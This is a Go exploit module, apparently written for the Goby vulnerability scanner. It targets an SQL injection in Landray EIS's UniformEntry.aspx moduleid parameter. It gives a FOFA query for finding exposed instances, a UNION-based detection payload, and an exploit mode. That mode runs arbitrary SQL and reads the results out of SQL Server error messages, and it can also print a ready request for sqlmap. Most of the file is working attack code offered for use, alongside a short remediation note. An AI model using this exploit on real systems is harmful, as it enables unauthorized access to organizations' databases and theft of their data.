package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "landray-EIS Intelligent Collaboration Platform /UniformEntry.aspx SQL Injection Vulnerability",
    "Description": "<p>landray Software, established in 2001, is a leading expert in intelligent office solutions, a national high-tech enterprise, a developer of national standards for knowledge management, and one of the top 10 suppliers in the \"Xinchuang\" (domestic innovation) sector. The company holds a leading position in China's digital office and knowledge management market. Lanling Software is committed to the mission of \"empowering digital transformation and making organizations smarter.\" Through its next-generation organizational collaboration and application development platform, it helps various organizations achieve efficient office operations and digital transformation. Lanling Software's products, including OA (Office Automation), portals, BPM (Business Process Management) workflows, and low-code solutions, are widely used in top enterprises across industries such as state-owned enterprises, manufacturing, finance, energy, healthcare, and education. The company has accumulated 50,000 mid-to-large customers across over 150 segmented industries.</p>",
    "Product": "Landray-EIS",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2024-08-06",
    "PostTime": "2024-08-07",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"/scripts/jquery.landray.common.js\" || body=\"v11_QRcodeBar clr\" || (body=\"欢迎登录智慧协同平台\" && body=\"login\")",
    "GobyQuery": "body=\"/scripts/jquery.landray.common.js\" || body=\"v11_QRcodeBar clr\" || (body=\"欢迎登录智慧协同平台\" && body=\"login\")",
    "Level": "2",
    "Impact": "<p>SQL injection is a serious security vulnerability that allows attackers to insert malicious SQL code into input fields of an application, thereby manipulating database queries.</p>",
    "Recommendation": "<p>Parameterized queries (Prepared Statements) are an effective way to prevent SQL injection. By using parameterized queries, the SQL query and data parameters are handled separately. Data parameters are not directly inserted into the SQL query, thus avoiding the injection of malicious SQL code.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "1%20and%201=@@version--+",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "蓝凌EIS智慧协同平台 /UniformEntry.aspx SQL 注入漏洞",
            "Product": "Landray-EIS智慧协同平台",
            "Description": "<p>蓝凌软件成立于2001年，是数智化办公专家、国家高新技术企业、知识管理国家标准制定者、信创供应商10强；居于中国数字化办公与知识管理市场领先地位；公司秉承“赋能数字化转型，让组织更智慧”的使命，通过新一代组织协同与应用开发平台，助力各类组织实现高效办公与数字化转型。蓝凌软件的OA、门户、BPM流程、低代码等产品，大量应用于国企、制造、金融、能源、医疗、教育等行业百强及中国500强企业，在150+细分行业积累了50000家中大型客户<br></p>",
            "Recommendation": "<p>参数化查询（Prepared Statements）是防止 SQL 注入的有效方法。在使用参数化查询时，SQL 查询与数据参数分开处理，数据参数不会直接插入到 SQL 查询中，从而避免了恶意 SQL 代码的注入。<br></p>",
            "Impact": "<p>SQL 注入（SQL Injection）是一种严重的安全漏洞，它允许攻击者在应用程序的输入字段中插入恶意的 SQL 代码，进而操控数据库查询<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "landray-EIS Intelligent Collaboration Platform /UniformEntry.aspx SQL Injection Vulnerability",
            "Product": "Landray-EIS",
            "Description": "<p>landray Software, established in 2001, is a leading expert in intelligent office solutions, a national high-tech enterprise, a developer of national standards for knowledge management, and one of the top 10 suppliers in the \"Xinchuang\" (domestic innovation) sector. The company holds a leading position in China's digital office and knowledge management market. Lanling Software is committed to the mission of \"empowering digital transformation and making organizations smarter.\" Through its next-generation organizational collaboration and application development platform, it helps various organizations achieve efficient office operations and digital transformation. Lanling Software's products, including OA (Office Automation), portals, BPM (Business Process Management) workflows, and low-code solutions, are widely used in top enterprises across industries such as state-owned enterprises, manufacturing, finance, energy, healthcare, and education. The company has accumulated 50,000 mid-to-large customers across over 150 segmented industries.<br></p>",
            "Recommendation": "<p>Parameterized queries (Prepared Statements) are an effective way to prevent SQL injection. By using parameterized queries, the SQL query and data parameters are handled separately. Data parameters are not directly inserted into the SQL query, thus avoiding the injection of malicious SQL code.<br></p>",
            "Impact": "<p>SQL injection is a serious security vulnerability that allows attackers to insert malicious SQL code into input fields of an application, thereby manipulating database queries.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9921"
}`

	sendPayload_nfvdjkdfhjvh := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//GET请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		url := `/third/DingTalk/Pages/UniformEntry.aspx?moduleid=` + sql
		headerMap := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
		}
		resp, err := setGetRequest(hostInfo, url, headerMap)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_nfvdjkdfhjvh
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "1+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%2878%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%28118%29%2BCHAR%2870%29%2BCHAR%28114%29%2BCHAR%28107%29%2BCHAR%28100%29%2BCHAR%2871%29%2BCHAR%2878%29%2BCHAR%2885%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28110%29%2BCHAR%2874%29%2BCHAR%2867%29%2BCHAR%2882%29%2BCHAR%2890%29%2BCHAR%2884%29%2BCHAR%2878%29%2BCHAR%2883%29%2BCHAR%2873%29%2BCHAR%2879%29%2BCHAR%28100%29%2BCHAR%2879%29%2BCHAR%2875%29%2BCHAR%28110%29%2BCHAR%28110%29%2BCHAR%28108%29%2BCHAR%2898%29%2BCHAR%2885%29%2BCHAR%2866%29%2BCHAR%28117%29%2BCHAR%2887%29%2BCHAR%2867%29%2BCHAR%2877%29%2BCHAR%2890%29%2BCHAR%28100%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL--+VYvX"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			//检测逻辑
			// re := regexp.MustCompile(`"([^"]+)":\[\{"date":`)
			// // 查找第一个匹配项
			// match := re.FindStringSubmatch(resp.Utf8Html)
			// // 如果找到了匹配项，返回第一个捕获组的内容
			// if len(match) < 1 {
			// 	return false
			// }
			if !strings.Contains(resp.Utf8Html, "qbzvqNUVvFrkdGNUbvnJCRZTNSIOdOKnnlbUBuWCMZdvqqkqbq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/third/DingTalk/Pages/UniformEntry.aspx?moduleid=`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_nfvdjkdfhjvh
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams 检查前面是否设置相关参数
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 查找第一个匹配项
				re := regexp.MustCompile(`<title>在将 nvarchar 值 '([\s\S]*?)' 转换成数据类型 int 时失败。</title>`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用
				expResult.Success = true
				expResult.Output = `GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1* HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
`
				return expResult

			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
